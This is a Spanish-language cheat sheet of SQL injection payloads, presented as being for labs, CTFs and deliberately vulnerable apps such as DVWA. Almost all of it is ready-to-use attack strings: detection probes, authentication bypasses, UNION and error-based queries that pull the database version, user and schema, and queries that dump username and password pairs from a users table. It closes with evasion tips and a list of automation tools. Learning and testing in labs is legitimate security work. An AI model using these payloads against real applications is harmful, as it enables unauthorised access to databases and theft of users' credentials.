# 🔍 SQLIjection PayLoads Cheatsheet

>  Lista de SQL Injection payloads comunes agrupados por categorías. Son útiles para pruebas manuales en aplicaciones vulnerables, como en laboratorios, CTFs o entornos como DVWA, OWASP BWA, Mr. Robot, etc.



---

##  🧪 1. Pruebas básicas para detectar SQLi

' OR '1'='1

" OR "1"="1

' OR 1=1 --

" OR 1=1 --

' OR 'a'='a

' #

'-- 

### 🛡️ 2. Bypass de autenticación (login forms)

admin' --

admin' #

admin' or '1'='1

' or 1=1 limit 1; --

' or sleep(5) --  -- (para detectar blind SQLi)

### 📊 3. Enumeración de datos

' UNION SELECT null, version() -- 

' UNION SELECT null, database() --

' UNION SELECT user(), password FROM users --

### 🧱 4. Errores intencionales (para SQLi basada en errores)

' AND 1=convert(int, (SELECT @@version)) --

' AND updatexml(null, concat(0x7e,(SELECT database()),0x7e), null) --

' AND extractvalue(1, concat(0x7e, user(), 0x7e)) --

### 🧾 6. Información del sistema (MySQL)

' UNION SELECT @@version --

' UNION SELECT database() --

' UNION SELECT table_name FROM information_schema.tables --

' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --

### 🧬 7. Exfiltración (si puedes hacer múltiples SELECT)

' UNION SELECT username, password FROM users --

' AND 1=1 UNION SELECT null, concat(username, ':', password) FROM users --

### ⚠️ Tips

Usa comentarios (--, #, /* */) para evitar errores en el resto de la query.

Prueba con diferentes comillas (', ", sin comillas) dependiendo del motor SQL.

Ajusta para la base de datos: MySQL, PostgreSQL, MSSQL, Oracle tienen diferentes funciones.

### 🧰 Herramientas para automatizar

sqlmap

Burp Suite (intruder + repeater)

sqlninja, jSQL, Havij (antiguo, educativo)




